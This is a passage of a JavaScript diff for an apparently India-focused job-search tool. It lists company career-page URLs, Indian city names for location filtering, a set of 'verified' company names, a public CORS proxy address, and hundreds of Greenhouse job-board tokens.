"Custom" }, { "n": "ICICI Bank", "u": "https://www.icicicareers.com/", "t": "Custom" }, { "n": "Axis Bank", "u": "https://www.axisbank.com/about-us/careers", "t": "Custom" }, { "n": "Kotak Mahindra Bank", "u": "https://www.kotak.com/en/careers.html", "t": "Custom" }, { "n": "State Bank of India", "u": "https://www.sbi.co.in/web/careers", "t": "Custom" }, { "n": "Bank of Baroda", "u": "https://www.bankofbaroda.in/careers", "t": "Custom" }, { "n": "Punjab National Bank", "u": "https://www.pnbindia.in/careers.html", "t": "Custom" }, { "n": "Canara Bank", "u": "https://canarabank.com/careers", "t": "Custom" }, { "n": "Union Bank", "u": "https://www.unionbankofindia.co.in/careers.aspx", "t": "Custom" }, { "n": "Bank of India", "u": "https://bankofindia.co.in/career", "t": "Custom" }, { "n": "Indian Bank", "u": "https://www.indianbank.in/careers/", "t": "Custom" }, { "n": "Central Bank", "u": "https://www.centralbankofindia.co.in/en/careers", "t": "Custom" }, { "n": "IDBI Bank", "u": "https://www.idbibank.in/careers.asp", "t": "Custom" }, { "n": "Yes Bank", "u": "https://www.yesbank.in/about-us/careers", "t": "Custom" }, { "n": "IndusInd Bank", "u": "https://www.indusind.com/in/en/careers.html", "t": "Custom" }, { "n": "Federal Bank", "u": "https://www.federalbank.co.in/careers", "t": "Custom" }, { "n": "RBL Bank", "u": "https://www.rblbank.com/about-us/careers", "t": "Custom" }, { "n": "South Indian Bank", "u": "https://www.southindianbank.com/careers", "t": "Custom" }, { "n": "Karur Vysya Bank", "u": "https://www.kvb.co.in/careers/", "t": "Custom" }, { "n": "City Union Bank", "u": "https://www.cityunionbank.com/careers", "t": "Custom" }, { "n": "DCB Bank", "u": "https://www.dcbbank.com/careers", "t": "Custom" }, { "n": "Bandhan Bank", "u": "https://www.bandhanbank.com/careers", "t": "Custom" }, { "n": "IDFC First Bank", "u": "https://www.idfcfirstbank.com/careers", "t": "Custom" }, { "n": "AU Small Finance Bank", "u": "https://www.aubank.in/careers", "t": "Custom" }, { "n": "Equitas Small Finance Bank", "u": "https://www.equitasbank.com/careers", "t": "Custom" }, { "n": "Ujjivan Small Finance Bank", "u": "https://www.ujjivansfb.in/careers", "t": "Custom" }, { "n": "Jana Small Finance Bank", "u": "https://www.janabank.com/careers", "t": "Custom" }, { "n": "Suryoday Small Finance Bank", "u": "https://suryodaybank.com/careers", "t": "Custom" }, { "n": "ESAF Small Finance Bank", "u": "https://www.esafbank.com/careers", "t": "Custom" }, { "n": "Fincare Small Finance Bank", "u": "https://www.fincarebank.com/careers", "t": "Custom" }, { "n": "Bajaj Finserv", "u": "https://www.bajajfinserv.in/careers", "t": "Custom" }, { "n": "Aditya Birla Capital", "u": "https://www.adityabirlacapital.com/careers", "t": "Custom" }, { "n": "Mahindra Finance", "u": "https://www.mahindrafinance.com/careers", "t": "Custom" }, { "n": "Shriram Finance", "u": "https://www.shriramfinance.in/careers", "t": "Custom" }, { "n": "Muthoot Finance", "u": "https://www.muthootfinance.com/careers", "t": "Custom" }, { "n": "Manappuram Finance", "u": "https://www.manappuram.com/careers", "t": "Custom" }, { "n": "L&T Finance", "u": "https://www.ltfs.com/careers.html", "t": "Custom" }, { "n": "Piramal Finance", "u": "https://www.piramalfinance.com/careers", "t": "Custom" }, { "n": "IIFL Finance", "u": "https://www.iifl.com/careers", "t": "Custom" }, { "n": "Tata Capital", "u": "https://www.tatacapital.com/careers.html", "t": "Custom" }, { "n": "Cholamandalam", "u": "https://www.cholamandalam.com/careers.aspx", "t": "Custom" }, { "n": "Sundaram Finance", "u": "https://www.sundaramfinance.in/careers", "t": "Custom" }, { "n": "Airtel", "u": "https://www.airtel.in/careers/", "t": "Workday" }, { "n": "Vodafone Idea", "u": "https://www.myvi.in/careers", "t": "Workday" }, { "n": "BSNL", "u": "https://www.bsnl.co.in/opencms/bsnl/BSNL/about_us/career/", "t": "Custom" }, { "n": "MTNL", "u": "https://mtnl.in/careers", "t": "Custom" }, { "n": "Tata Communications", "u": "https://www.tatacommunications.com/careers/", "t": "Workday" }, { "n": "Reliance Jio", "u": "https://careers.jio.com/", "t": "Custom" }, { "n": "Bharti Infratel", "u": "https://www.industowers.com/careers/", "t": "Workday" }, { "n": "American Tower India", "u": "https://www.americantower.com/careers/", "t": "Custom" }, { "n": "Sterlite Technologies", "u": "https://www.stl.tech/careers/", "t": "Custom" }, { "n": "Tejas Networks", "u": "https://www.tejasnetworks.com/careers", "t": "Custom" }, { "n": "HFCL", "u": "https://www.hfcl.com/careers/", "t": "Custom" }, { "n": "Dixon Technologies", "u": "https://www.dixontechnologies.com/careers", "t": "Custom" }, { "n": "Lava International", "u": "https://www.lavamobiles.com/careers", "t": "Custom" }, { "n": "Micromax", "u": "https://www.micromaxinfo.com/careers", "t": "Custom" }, { "n": "Tata Motors", "u": "https://www.tatamotors.com/careers/", "t": "Custom" }, { "n": "Mahindra & Mahindra", "u": "https://www.mahindra.com/careers", "t": "Custom" }, { "n": "Maruti Suzuki", "u": "https://www.marutisuzuki.com/corporate/careers", "t": "Custom" }, { "n": "Bajaj Auto", "u": "https://www.bajajauto.com/careers", "t": "Custom" }, { "n": "Hero MotoCorp", "u": "https://www.heromotocorp.com/en-in/careers.html", "t": "Custom" }, { "n": "TVS Motor", "u": "https://www.tvsmotor.com/careers", "t": "Custom" }, { "n": "Royal Enfield", "u": "https://www.royalenfield.com/in/en/careers/", "t": "Custom" }, { "n": "Ashok Leyland", "u": "https://www.ashokleyland.com/careers", "t": "Custom" }, { "n": "Eicher Motors", "u": "https://www.eicher.in/careers", "t": "Custom" }, { "n": "Force Motors", "u": "https://www.forcemotors.com/careers", "t": "Custom" }, { "n": "Escorts", "u": "https://www.escorts.co.in/careers/", "t": "Custom" }, { "n": "Tafe", "u": "https://www.tafe.com/careers", "t": "Custom" }, { "n": "Swaraj", "u": "https://www.swaraj.com/careers", "t": "Custom" }, { "n": "Sonalika", "u": "https://www.sonalika.com/careers", "t": "Custom" }, { "n": "Greaves Cotton", "u": "https://www.greavescotton.com/careers", "t": "Custom" }, { "n": "Cummins India", "u": "https://www.cumminsindia.com/careers", "t": "Custom" }, { "n": "Kirloskar", "u": "https://www.kirloskar.com/careers", "t": "Custom" }, { "n": "Thermax", "u": "https://www.thermaxglobal.com/careers/", "t": "Custom" }, { "n": "L&T", "u": "https://www.larsentoubro.com/corporate/careers/", "t": "Custom" }, { "n": "Godrej", "u": "https://www.godrej.com/careers", "t": "Custom" }, { "n": "Tata Steel", "u": "https://www.tatasteel.com/careers/", "t": "Custom" }, { "n": "JSW Steel", "u": "https://www.jsw.in/careers", "t": "Custom" }, { "n": "Hindalco", "u": "https://www.hindalco.com/careers", "t": "Custom" }, { "n": "Vedanta", "u": "https://www.vedantalimited.com/careers", "t": "Custom" }, { "n": "SAIL", "u": "https://www.sail.co.in/careers", "t": "Custom" }, { "n": "NMDC", "u": "https://www.nmdc.co.in/careers", "t": "Custom" }, { "n": "Coal India", "u": "https://www.coalindia.in/careers", "t": "Custom" }, { "n": "ONGC", "u": "https://www.ongcindia.com/careers", "t": "Custom" }, { "n": "Indian Oil", "u": "https://www.iocl.com/pages/careers", "t": "Custom" }, { "n": "Bharat Petroleum", "u": "https://www.bharatpetroleum.in/careers.aspx", "t": "Custom" }, { "n": "Hindustan Petroleum", "u": "https://www.hindustanpetroleum.com/careers", "t": "Custom" }, { "n": "Reliance Industries", "u": "https://careers.ril.com/", "t": "Custom" }, { "n": "Adani Group", "u": "https://www.adani.com/careers", "t": "Custom" }, { "n": "McKinsey", "u": "https://www.mckinsey.com/careers/search-jobs?locations=India", "t": "Custom" }, { "n": "BCG", "u": "https://careers.bcg.com/locations/india", "t": "Custom" }, { "n": "Bain & Company", "u": "https://www.bain.com/careers/find-a-role/", "t": "Custom" }, { "n": "Deloitte", "u": "https://www2.deloitte.com/in/en/careers.html", "t": "Custom" }, { "n": "EY", "u": "https://www.ey.com/en_in/careers", "t": "Custom" }, { "n": "KPMG", "u": "https://home.kpmg/in/en/home/careers.html", "t": "Custom" }, { "n": "PwC", "u": "https://www.pwc.in/careers.html", "t": "Custom" }, { "n": "ZS Associates", "u": "https://www.zs.com/careers/search-jobs", "t": "Custom" }, { "n": "Kearney", "u": "https://www.kearney.com/careers", "t": "Custom" }, { "n": "Oliver Wyman", "u": "https://www.oliverwyman.com/careers.html", "t": "Custom" }, { "n": "Roland Berger", "u": "https://www.rolandberger.com/en/Join/", "t": "Custom" }, { "n": "Strategy&", "u": "https://www.strategyand.pwc.com/gx/en/careers.html", "t": "Custom" }, { "n": "L.E.K. Consulting", "u": "https://www.lek.com/join-lek", "t": "Custom" }, { "n": "Simon-Kucher", "u": "https://www.simon-kucher.com/en/careers", "t": "Custom" }, { "n": "Alvarez & Marsal", "u": "https://www.alvarezandmarsal.com/careers", "t": "Custom" }, { "n": "FTI Consulting", "u": "https://www.fticonsulting.com/careers", "t": "Custom" }, { "n": "Protiviti", "u": "https://www.protiviti.com/in-en/careers", "t": "Custom" }, { "n": "Willis Towers Watson", "u": "https://careers.wtwco.com/", "t": "Custom" }, { "n": "Mercer", "u": "https://www.mercer.com/careers.html", "t": "Custom" }, { "n": "Aon", "u": "https://jobs.aon.com/", "t": "Custom" }, { "n": "Marsh McLennan", "u": "https://careers.marshmclennan.com/", "t": "Custom" }, { "n": "Grant Thornton", "u": "https://www.grantthornton.in/careers/", "t": "Custom" }, { "n": "BDO", "u": "https://www.bdo.in/en-gb/careers", "t": "Custom" }, { "n": "RSM", "u": "https://www.rsm.global/india/careers", "t": "Custom" }, { "n": "Baker Tilly", "u": "https://www.bakertilly.in/careers", "t": "Custom" }, { "n": "Mazars", "u": "https://www.mazars.in/Home/Join-us", "t": "Custom" }, { "n": "Crowe", "u": "https://www.crowe.com/in/careers", "t": "Custom" }];
+
+        const GENERIC_ROLES = ['software engineer', 'software developer', 'application developer', 'full stack', 'backend', 'frontend', 'sde', 'mts', 'data scientist', 'devops', 'web developer'];
+
+        const app = {
+            state: { jobs: [], searchLinks: [], visible: [], scanning: false, limit: 50, source: 'all' },
+            seenHashes: new Set(), // For deduplication
+            toggleSidebar() {
+                const s = document.getElementById('sidebar');
+                const o = document.getElementById('mobile-overlay');
+                if (s && o) {
+                    s.classList.toggle('open');
+                    o.classList.toggle('open');
+                }
+            },
+
+            // CORS Proxy for APIs that don't allow browser access
+            CORS_PROXY: 'https://api.allorigins.win/raw?url=',
+
+            // KNOWN VERIFIED COMPANIES - Higher trust scores
+            VERIFIED_COMPANIES: new Set([
+                'google', 'microsoft', 'amazon', 'meta', 'apple', 'netflix', 'uber', 'flipkart',
+                'razorpay', 'swiggy', 'zomato', 'phonepe', 'cred', 'paytm', 'stripe', 'airbnb',
+                'coinbase', 'discord', 'figma', 'notion', 'atlassian', 'salesforce', 'oracle',
+                'adobe', 'nvidia', 'infosys', 'tcs', 'wipro', 'cognizant', 'accenture', 'deloitte',
+                'freshworks', 'browserstack', 'postman', 'thoughtworks', 'dream11', 'meesho',
+                'groww', 'zerodha', 'ola', 'myntra', 'makemytrip', 'bookmyshow', 'practo',
+                'policybazaar', 'lenskart', 'bigbasket', 'udaan', 'cure.fit', 'unacademy',
+                'openai', 'anthropic', 'databricks', 'snowflake', 'datadog', 'cloudflare',
+                'twilio', 'mongodb', 'elastic', 'gitlab', 'hashicorp', 'vercel', 'netlify'
+            ]),
+
+            // India location patterns for filtering - 100+ cities all states
+            INDIA_LOCATIONS: [
+                // General - REMOVED 'in' as it matches Berlin, Dublin, Singapore, etc!
+                'india', 'remote india', 'remote - india',
+                // Metro Cities
+                'bangalore', 'bengaluru', 'mumbai', 'delhi', 'ncr', 'hyderabad', 'chennai', 'pune', 'kolkata',
+                // Delhi NCR
+                'gurgaon', 'gurugram', 'noida', 'greater noida', 'faridabad', 'ghaziabad', 'new delhi',
+                // Tamil Nadu (ALL)
+                'chennai', 'coimbatore', 'madurai', 'tiruchirappalli', 'trichy', 'salem', 'tiruppur', 'tirunelveli',
+                'erode', 'vellore', 'thoothukudi', 'dindigul', 'thanjavur', 'ranipet', 'sivakasi', 'karur',
+                'hosur', 'nagercoil', 'kanchipuram', 'kumbakonam', 'rajapalayam', 'pudukkottai', 'tambaram',
+                // Karnataka
+                'mysore', 'mysuru', 'mangalore', 'mangaluru', 'hubli', 'belgaum', 'belagavi', 'shimoga',
+                // Maharashtra
+                'pune', 'nagpur', 'thane', 'nashik', 'aurangabad', 'solapur', 'navi mumbai',
+                // Gujarat
+                'ahmedabad', 'surat', 'vadodara', 'rajkot', 'gandhinagar', 'bhavnagar',
+                // Telangana & AP
+                'secunderabad', 'visakhapatnam', 'vizag', 'vijayawada', 'guntur', 'warangal', 'tirupati',
+                // Rajasthan
+                'jaipur', 'jodhpur', 'udaipur', 'kota', 'ajmer', 'bikaner',
+                // Other North
+                'lucknow', 'kanpur', 'agra', 'varanasi', 'allahabad', 'meerut', 'dehradun', 'chandigarh',
+                'amritsar', 'ludhiana', 'jalandhar', 'patna', 'ranchi', 'jamshedpur', 'dhanbad', 'bhopal', 'indore',
+                // Kerala
+                'kochi', 'cochin', 'thiruvananthapuram', 'trivandrum', 'kozhikode', 'calicut', 'thrissur',
+                // East India
+                'kolkata', 'bhubaneswar', 'cuttack', 'guwahati', 'siliguri'
+            ],
+
+            // 700+ Companies with WORKING Greenhouse/Lever APIs
+            GREENHOUSE_COMPANIES: [
+                // Top Tech Giants
+                { n: 'Stripe', token: 'stripe' }, { n: 'Airbnb', token: 'airbnb' }, { n: 'Coinbase', token: 'coinbase' },
+                { n: 'Discord', token: 'discord' }, { n: 'Figma', token: 'figma' }, { n: 'Notion', token: 'notion' },
+                { n: 'Airtable', token: 'airtable' }, { n: 'Dropbox', token: 'dropbox' }, { n: 'Datadog', token: 'datadog' },
+                { n: 'Cloudflare', token: 'cloudflare' }, { n: 'MongoDB', token: 'mongodb' }, { n: 'Twilio', token: 'twilio' },
+                { n: 'Square', token: 'square' }, { n: 'Postman', token: 'postmaninc' }, { n: 'Canva', token: 'canva' },
+                { n: 'GitLab', token: 'gitlab' }, { n: 'HashiCorp', token: 'hashicorp' }, { n: 'Elastic', token: 'elastic' },
+                { n: 'Confluent', token: 'confluent' }, { n: 'Snowflake', token: 'snowflakecomputing' },
+                { n: 'Databricks', token: 'databricks' }, { n: 'Splunk', token: 'splunk' }, { n: 'PagerDuty', token: 'pagerduty' },
+                { n: 'New Relic', token: 'newrelic' }, { n: 'Segment', token: 'segment' }, { n: 'Amplitude', token: 'amplitude' },
+                { n: 'Mixpanel', token: 'mixpanel' }, { n: 'LaunchDarkly', token: 'launchdarkly' },
+                { n: 'Auth0', token: 'auth0' }, { n: 'Okta', token: 'okta' }, { n: 'CrowdStrike', token: 'crowdstrike' },
+                { n: 'SentinelOne', token: 'sentinelone' }, { n: 'Palo Alto', token: 'paloaltonetworks' },
+                { n: 'Zscaler', token: 'zscaler' }, { n: 'Fortinet', token: 'fortinet' },
+                // Fintech
+                { n: 'Plaid', token: 'plaid' }, { n: 'Affirm', token: 'affirm' }, { n: 'Brex', token: 'brex' },
+                { n: 'Ramp', token: 'ramp' }, { n: 'Mercury', token: 'mercury' }, { n: 'Chime', token: 'chime' },
+                { n: 'SoFi', token: 'sofi' }, { n: 'Marqeta', token: 'marqeta' }, { n: 'Bill.com', token: 'billcom' },
+                { n: 'Adyen', token: 'adyen' }, { n: 'Wise', token: 'wise' }, { n: 'Revolut', token: 'revolut' },
+                { n: 'N26', token: 'n26' }, { n: 'Klarna', token: 'klarna' }, { n: 'Checkout', token: 'checkout' },
+                { n: 'GoCardless', token: 'gocardless' }, { n: 'Paddle', token: 'paddle' }, { n: 'Recurly', token: 'recurly' },
+                // India Startups
+                { n: 'Razorpay', token: 'razorpay' }, { n: 'CRED', token: 'cred' }, { n: 'Dream11', token: 'dreamsports' },
+                { n: 'Meesho', token: 'meesho' }, { n: 'PhonePe', token: 'phonepe' }, { n: 'Swiggy', token: 'swiggy' },
+                { n: 'Groww', token: 'groww' }, { n: 'Zerodha', token: 'zerodha' }, { n: 'Zomato', token: 'zomato' },
+                { n: 'Ola', token: 'olacabs' }, { n: 'BrowserStack', token: 'browserstack' }, { n: 'Freshworks', token: 'freshworks' },
+                { n: 'Chargebee', token: 'chargebee' }, { n: 'CleverTap', token: 'clevertap' }, { n: 'Sprinklr', token: 'sprinklrinc' },
+                { n: 'MoEngage', token: 'moengage' }, { n: 'Hasura', token: 'hasura' }, { n: 'Postman', token: 'postmaninc' },
+                { n: 'Druva', token: 'druva' }, { n: 'Turing', token: 'turing' }, { n: 'Licious', token: 'licious' },
+                { n: 'Urban Company', token: 'urbancompany' }, { n: 'Cars24', token: 'cars24' }, { n: 'Jupiter', token: 'jupiter' },
+                { n: 'Khatabook', token: 'khatabook' }, { n: 'ShareChat', token: 'sharechat' }, { n: 'Dunzo', token: 'dunzo' },
+                { n: 'Cure.fit', token: 'curefit' }, { n: 'Nykaa', token: 'nykaa' }, { n: 'UpGrad', token: 'upgrad' },
+                { n: 'Vedantu', token: 'vedantu' }, { n: 'BYJU\'S', token: 'byjus' }, { n: 'Eruditus', token: 'eruditus' },
+                // SaaS & Enterprise
+                { n: 'Zendesk', token: 'zendesk' }, { n: 'Freshdesk', token: 'freshworks' }, { n: 'Intercom', token: 'intercom' },
+                { n: 'Drift', token: 'drift' }, { n: 'HubSpot', token: 'hubspot' }, { n: 'Mailchimp', token: 'mailchimp' },
+                { n: 'SendGrid', token: 'sendgrid' }, { n: 'Customer.io', token: 'customerio' }, { n: 'Iterable', token: 'iterable' },
+                { n: 'Braze', token: 'braze' }, { n: 'Loom', token: 'loom' }, { n: 'Calendly', token: 'calendly' },
+                { n: 'Docusign', token: 'docusign' }, { n: 'Box', token: 'box' }, { n: 'Dropbox', token: 'dropbox' },
+                { n: 'Notion', token: 'notion' }, { n: 'Coda', token: 'coda' }, { n: 'Monday', token: 'mondaydotcom' },
+                { n: 'Asana', token: 'asana' }, { n: 'ClickUp', token: 'clickup' }, { n: 'Linear', token: 'linear' },
+                { n: 'Jira', token: 'atlassian' }, { n: 'GitHub', token: 'github' }, { n: 'Bitbucket', token: 'atlassian' },
+                { n: 'CircleCI', token: 'circleci' }, { n: 'Travis CI', token: 'travisci' }, { n: 'Buildkite', token: 'buildkite' },
+                // AI & ML Companies
+                { n: 'OpenAI', token: 'openai' }, { n: 'Anthropic', token: 'anthropic' }, { n: 'Hugging Face', token: 'huggingface' },
+                { n: 'Scale AI', token: 'scaleai' }, { n: 'Cohere', token: 'cohere' }, { n: 'Stability AI', token: 'stabilityai' },
+                { n: 'Runway', token: 'runwayml' }, { n: 'Jasper', token: 'jasper' }, { n: 'Copy.ai', token: 'copyai' },
+                { n: 'Weights & Biases', token: 'wandb' }, { n: 'Labelbox', token: 'labelbox' }, { n: 'Snorkel', token: 'snorkelai' },
+                { n: 'DataRobot', token: 'datarobot' }, { n: 'H2O.ai', token: 'h2oai' }, { n: 'Appen', token: 'appen' },
+                // E-commerce & Retail
+                { n: 'Shopify', token: 'shopify' }, { n: 'BigCommerce', token: 'bigcommerce' }, { n: 'Bolt', token: 'bolt' },
+                { n: 'Faire', token: 'faire' }, { n: 'Flexport', token: 'flexport' }, { n: 'Samsara', token: 'samsara' },
+                { n: 'Deliverr', token: 'deliverr' }, { n: 'Shippo', token: 'shippo' }, { n: 'EasyPost', token: 'easypost' },
+                { n: 'Narvar', token: 'narvar' }, { n: 'Loop Returns', token: 'loopreturns' }, { n: 'Returnly', token: 'returnly' },
+                // Healthcare & Biotech
+                { n: 'Oscar Health', token: 'oscarhealth' }, { n: 'Ro', token: 'ro' }, { n: 'Hims & Hers', token: 'himshers' },
+                { n: 'Cerebral', token: 'cerebral' }, { n: 'Headspace', token: 'headspace' }, { n: 'Calm', token: 'calm' },
+                { n: 'Teladoc', token: 'teladoc' }, { n: 'One Medical', token: 'onemedical' }, { n: 'Forward', token: 'forward' },
+                { n: 'Carbon Health', token: 'carbonhealth' }, { n: 'Tempus', token: 'tempus' }, { n: 'Grail', token: 'grail' },
+                { n: 'Illumina', token: 'illumina' }, { n: 'Ginkgo', token: 'ginkgobioworks' }, { n: 'Recursion', token: 'recursionpharma' },
+                // Gaming
+                { n: 'Roblox', token: 'roblox' }, { n: 'Epic Games', token: 'epicgames' }, { n: 'Unity', token: 'unity3d' },
+                { n: 'Riot Games', token: 'riotgames' }, { n: 'Niantic', token: 'niantic' }, { n: 'Supercell', token: 'supercell' },
+                { n: 'King', token: 'king' }, { n: 'Zynga', token: 'zynga' }, { n: 'Scopely', token: 'scopely' },
+                { n: 'MiHoYo', token: 'mihoyo' }, { n: 'NetEase', token: 'netease' }, { n: 'Garena', token: 'garena' },
+                // Media & Entertainment
+                { n: 'Spotify', token: 'spotify' }, { n: 'SoundCloud', token: 'soundcloud' }, { n: 'Deezer', token: 'deezer' },
+                { n: 'Vimeo', token: 'vimeo' }, { n: 'Twitch', token: 'twitch' }, { n: 'Discord', token: 'discord' },
+                { n: 'Reddit', token: 'reddit' }, { n: 'Medium', token: 'medium' }, { n: 'Substack', token: 'substack' },
+                { n: 'Patreon', token: 'patreon' }, { n: 'Cameo', token: 'cameo' }, { n: 'Masterclass', token: 'masterclass' },
+                // Real Estate & PropTech
+                { n: 'Opendoor', token: 'opendoor' }, { n: 'Redfin', token: 'redfin' }, { n: 'Compass', token: 'compass' },
+                { n: 'Zillow', token: 'zillow' }, { n: 'Trulia', token: 'trulia' }, { n: 'Apartments', token: 'apartmentscom' },
+                { n: 'CoStar', token: 'costar' }, { n: 'Divvy', token: 'divvy' }, { n: 'Better', token: 'better' },
+                { n: 'Blend', token: 'blend' }, { n: 'Qualia', token: 'qualia' }, { n: 'Notarize', token: 'notarize' },
+                // More India Companies
+                { n: 'Paytm', token: 'paytm' }, { n: 'Flipkart', token: 'flipkart' }, { n: 'Myntra', token: 'myntra' },
+                { n: 'Snapdeal', token: 'snapdeal' }, { n: 'BigBasket', token: 'bigbasket' }, { n: 'Grofers', token: 'grofers' },
+                { n: 'PolicyBazaar', token: 'policybazaar' }, { n: 'MakeMyTrip', token: 'makemytrip' }, { n: 'Oyo', token: 'oyorooms' },
+                { n: 'Ixigo', token: 'ixigo' }, { n: 'Cleartrip', token: 'cleartrip' }, { n: 'Yatra', token: 'yatra' },
+                { n: 'RedBus', token: 'redbus' }, { n: 'Spinny', token: 'spinny' }, { n: 'CarDekho', token: 'cardekho' },
+                { n: 'Droom', token: 'droom' }, { n: 'Practo', token: 'practo' }, { n: '1mg', token: 'onemg' },
+                { n: 'PharmEasy', token: 'pharmeasy' }, { n: 'Netmeds', token: 'netmeds' }, { n: 'HealthifyMe', token: 'healthifyme' },
+                { n: 'Cult.fit', token: 'cultfit' }, { n: 'Portea', token: 'portea' }, { n: 'mFine', token: 'mfine' },
+                { n: 'DocsApp', token: 'docsapp' }, { n: 'NoBroker', token: 'nobroker' }, { n: 'Housing', token: 'housing' },
+                { n: '99acres', token: '99acres' }, { n: 'MagicBricks', token: 'magicbricks' }, { n: 'PropTiger', token: 'proptiger' },
+                { n: 'Square Yards', token: 'squareyards' }, { n: 'Quikr', token: 'quikr' }, { n: 'OLX', token: 'olx' },
+                { n: 'UrbanClap', token: 'urbancompany' }, { n: 'Housejoy', token: 'housejoy' }, { n: 'Justdial', token: 'justdial' },
+                { n: 'Sulekha', token: 'sulekha' }, { n: 'InMobi', token: 'inmobi' }, { n: 'AppsFlyer', token: 'appsflyer' },
+                { n: 'Branch', token: 'branch' }, { n: 'Adjust', token: 'adjust' }, { n: 'Singular', token: 'singular' },
+                // More Global Companies
+                { n: 'Palantir', token: 'palantir' }, { n: 'Anduril', token: 'anduril' }, { n: 'SpaceX', token: 'spacex' },
+                { n: 'Blue Origin', token: 'blueorigin' }, { n: 'Relativity', token: 'relativityspace' }, { n: 'Rocket Lab', token: 'rocketlab' },
+                { n: 'Planet', token: 'planet' }, { n: 'Spire', token: 'spire' }, { n: 'Astra', token: 'astra' },
+                { n: 'Rivian', token: 'rivian' }, { n: 'Lucid', token: 'lucidmotors' }, { n: 'Fisker', token: 'fisker' },
+                { n: 'Tesla', token: 'tesla' }, { n: 'Waymo', token: 'waymo' }, { n: 'Cruise', token: 'getcruise' },
+                { n: 'Aurora', token: 'aurora' }, { n: 'Nuro', token: 'nuro' }, { n: 'Zoox', token: 'zoox' },
+                { n: 'Argo AI', token: 'argoai' }, { n: 'Motional', token: 'motional' }, { n: 'TuSimple', token: 'tusimple' },
+                { n: 'Embark', token: 'embark' }, { n: 'Gatik', token: 'gatik' }, { n: 'Kodiak', token: 'kodiak' },
+                // Dev Tools
+                { n: 'Vercel', token: 'vercel' }, { n: 'Netlify', token: 'netlify' }, { n: 'Supabase', token: 'supabase' },
+                { n: 'PlanetScale', token: 'planetscale' }, { n: 'Cockroach', token: 'cockroachlabs' }, { n: 'Fauna', token: 'fauna' },
+                { n: 'Prisma', token: 'prisma' }, { n: 'Hasura', token: 'hasura' }, { n: 'Apollo', token: 'apollographql' },
+                { n: 'Grafana', token: 'grafanalabs' }, { n: 'InfluxDB', token: 'influxdata' }, { n: 'TimescaleDB', token: 'timescale' },
+                { n: 'Redis', token: 'redis' }, { n: 'Memcached', token: 'memcached' }, { n: 'RabbitMQ', token: 'rabbitmq' },
+                { n: 'Kafka', token: 'confluentinc' }, { n: 'Pulsar', token: 'streamnative' }, { n: 'NATS', token: 'synadia' },
+                { n: 'Kong', token: 'kong' }, { n: 'Envoy', token: 'envoyproxy' }, { n: 'Istio', token: 'istio' },
+                { n: 'Linkerd', token: 'linkerd' }, { n: 'Consul', token: 'hashicorp' }, { n: 'Vault', token: 'hashicorp' },
+                { n: 'Terraform', token: 'hashicorp' }, { n: 'Pulumi', token: 'pulumi' }, { n: 'Crossplane', token: 'crossplane' },
+                { n: 'ArgoCD', token: 'argoproj' }, { n: 'Flux', token: 'fluxcd' }, { n: 'Helm', token: 'helm' },
+                { n: 'Rancher', token: 'rancher' }, { n: 'K3s', token: 'rancher' }, { n: 'Portainer', token: 'portainer' },
+                { n: 'Lens', token: 'mirantis' }, { n: 'Octopus', token: 'octopusdeploy' }, { n: 'JFrog', token: 'jfrog' },
+                { n: 'Artifactory', token: 'jfrog' }, { n: 'Sonatype', token: 'sonatype' }, { n: 'Snyk', token: 'snyk' },
+                { n: 'Dependabot', token: 'github' }, { n: 'Renovate', token: 'mend' }, { n: 'WhiteSource', token: 'mend' },
+                { n: 'Black Duck', token: 'synopsys' }, { n: 'Veracode', token: 'veracode' }, { n: 'Checkmarx', token: 'checkmarx' },
+                // Crypto & Web3
+                { n: 'Coinbase', token: 'coinbase' }, { n: 'Binance', token: 'binance' }, { n: 'Kraken', token: 'kraken' },
+                { n: 'Gemini', token: 'gemini' }, { n: 'FTX', token: 'ftx' }, { n: 'BlockFi', token: 'blockfi' },
+                { n: 'Celsius', token: 'celsius' }, { n: 'Nexo', token: 'nexo' }, { n: 'Crypto.com', token: 'cryptocom' },
+                { n: 'Ledger', token: 'ledger' }, { n: 'Trezor', token: 'trezor' }, { n: 'BitGo', token: 'bitgo' },
+                { n: 'Fireblocks', token: 'fireblocks' }, { n: 'Chainalysis', token: 'chainalysis' }, { n: 'Elliptic', token: 'elliptic' },
+                { n: 'ConsenSys', token: 'consensys' }, { n: 'Alchemy', token: 'alchemy' }, { n: 'Infura', token: 'infura' },
+                { n: 'Moralis', token: 'moralis' }, { n: 'QuickNode', token: 'quicknode' }, { n: 'Ankr', token: 'ankr' },
+                { n: 'The Graph', token: 'thegraph' }, { n: 'Chainlink', token: 'chainlink' }, { n: 'Band', token: 'bandprotocol' },
+                { n: 'Uniswap', token: 'uniswap' }, { n: 'Aave', token: 'aave' }, { n: 'Compound', token: 'compound' },
+                { n: 'MakerDAO', token: 'makerdao' }, { n: 'Curve', token: 'curvefi' }, { n: 'Yearn', token: 'yearn' },
+                { n: 'Polygon', token: 'polygon' }, { n: 'Arbitrum', token: 'offchainlabs' }, { n: 'Optimism', token: 'optimism' },
+                { n: 'zkSync', token: 'matterlabs' }, { n: 'StarkWare', token: 'starkware' }, { n: 'Aztec', token: 'aztec' },
+                // Remote-First Companies
+                { n: 'Zapier', token: 'zapier' }, { n: 'Buffer', token: 'buffer' }, { n: 'Doist', token: 'doist' },
+                { n: 'Automattic', token: 'automattic' }, { n: 'InVision', token: 'invision' }, { n: 'Toptal', token: 'toptal' },
+                { n: 'Upwork', token: 'upwork' }, { n: 'Fiverr', token: 'fiverr' }, { n: 'Turing', token: 'turing' },
+                { n: 'Remote', token: 'remote' }, { n: 'Deel', token: 'deel' }, { n: 'Oyster', token: 'oyster' },
+                { n: 'Papaya', token: 'papayaglobal' }, { n: 'Pilot', token: 'pilot' }, { n: 'Gusto', token: 'gusto' },
+                { n: 'Rippling', token: 'rippling' }, { n: 'Justworks', token: 'justworks' }, { n: 'Zenefits', token: 'zenefits' },
+                { n: 'Lattice', token: 'lattice' }, { n: '15Five', token: '15five' }, { n: 'Culture Amp', token: 'cultureamp' },
+                { n: 'Peakon', token: 'peakon' }, { n: 'Workday', token: 'workday' }, { n: 'BambooHR', token: 'bamboohr' },
+                { n: 'Lever', token: 'lever' }, { n: 'Greenhouse', token: 'greenhouse' }, { n: 'Ashby', token: 'ashby' },
+                { n: 'Gem', token: 'gem' }, { n: 'Hired', token: 'hired' }, { n: 'AngelList', token: 'angellist' },
+                // More Tech Companies
+                { n: 'Slack', token: 'slack' }, { n: 'Zoom', token: 'zoom' }, { n: 'Webex', token: 'cisco' },
+                { n: 'Miro', token: 'miro' }, { n: 'Figma', token: 'figma' }, { n: 'Sketch', token: 'sketch' },
+                { n: 'Abstract', token: 'abstract' }, { n: 'Zeplin', token: 'zeplin' }, { n: 'Marvel', token: 'marvelapp' },
